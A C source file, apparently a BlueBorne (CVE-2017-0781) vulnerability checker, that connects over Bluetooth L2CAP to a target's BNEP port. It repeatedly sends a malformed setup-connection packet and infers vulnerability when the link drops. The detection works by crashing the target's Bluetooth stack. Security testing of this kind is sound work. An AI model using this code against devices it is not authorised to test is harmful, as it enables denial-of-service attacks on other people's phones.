#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/l2cap.h>


/************************** BEGINING of the MACRO  ****************************/
// Source for the macro: https://stackoverflow.com/a/27351464/6261633
#if defined(DEBUG) && DEBUG > 0
 #define DEBUG_PRINT(fmt, args...) fprintf(stderr, "DEBUG: %s:%d:%s(): " fmt, \
             __FILE__, __LINE__, __func__, ##args)
#else
 #define DEBUG_PRINT(fmt, args...) /* Don't do anything in release builds */
#endif

/**************************  END of the MACRO  ********************************/

#define CRASH_ATTEMPTS 1000


int build_packet(unsigned char *packet, int size_of_packet){
    unsigned char type = 0x81;              // Extenstion present bit, BNEP_FRAME_CONTROL 0x01 | 0x80 Extension bit
    unsigned char control_type = 0x01;      // BNEP_SETUP_CONNECTION_REQUEST_MSG (0x01)
    unsigned char len = 0x00;               // To prevent setting BNEP_STATE_CONNECTED in 'con_state' as default value (0x00)
    unsigned char data = 0x41;              // Random data
    int buffer_offset = 0;

    memcpy(packet + buffer_offset++, &type, 1);
    memcpy(packet + buffer_offset++, &control_type, 1);
    memcpy(packet + buffer_offset++, &len, 1);
    for(; buffer_offset < size_of_packet - 1; buffer_offset++)
        memcpy(packet + buffer_offset, &data, 1);
    
    return size_of_packet;
}


int main(int argc, char* argv[]){
    int sock, packet_len, received_bytes, vulnerable;
    struct sockaddr_l2 addr_remote;
    char mac_address[19];
    char received_buffer[1024] = {0};
    struct timeval timeout;

    DEBUG_PRINT("Debugging is enabled\n");

    // Parse command line argument
    if(argc == 2){
        strncpy(mac_address, argv[1], 18);
    }else{
        printf("Use:\t./detectBlueborne <MAC address>\n");
        return -1;
    }
    
    timeout.tv_sec = 2;
    timeout.tv_usec = 0;

    // Set value for remote address
    memset(&addr_remote, 0, sizeof(addr_remote));
    addr_remote.l2_family = AF_BLUETOOTH;
    addr_remote.l2_psm = htobs(15);          // L2CAP port for BNEP
    str2ba(mac_address, &addr_remote.l2_bdaddr);

    // Allocate memory for manualy created packet
    unsigned char *packet;
    int size_of_packet = 20;
    packet = malloc(size_of_packet);
    packet_len = build_packet(packet, size_of_packet);


    // Socket for Bluetooth, connection-mode, bidirectional stream, L2CAP protocol
    sock = socket(AF_BLUETOOTH, SOCK_SEQPACKET, BTPROTO_L2CAP);
    if(sock < 0){
        perror("Socket failed to create\n");
        return -1;
    }
    DEBUG_PRINT("Socket created\n");

    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));

    if(connect(sock, (struct sockaddr *) &addr_remote, sizeof(addr_remote)) < 0){
        perror("Connecting to dst failed\n");
        return -1;
    }
    DEBUG_PRINT("Socket is connected\n");

    DEBUG_PRINT("Starting sending packets\n");
    for(int i = 0; i < CRASH_ATTEMPTS; i++){

        sleep(0.1);
        if(send(sock, packet, packet_len,  0) < 0){
            perror("Sending failed\n");
            return -1;
        }
    
        received_bytes = read(sock, received_buffer, sizeof(received_buffer));
        if(received_bytes <= 0){
            printf("Device is probably vulnerable to CVE-2017-0781\n");
            vulnerable = 1;
            DEBUG_PRINT("%d\n", errno);
            DEBUG_PRINT("Stopped with packet n.%d\n", i);
            break;
        }
        sleep(0.1);
        vulnerable = 0;
    }
    if(vulnerable == 0){
        printf("Device is NOT vulnerable to CVE-2017-0781\n");
    }
    DEBUG_PRINT("Packet sending stoped\n");
    close(sock);

    return 0;
}
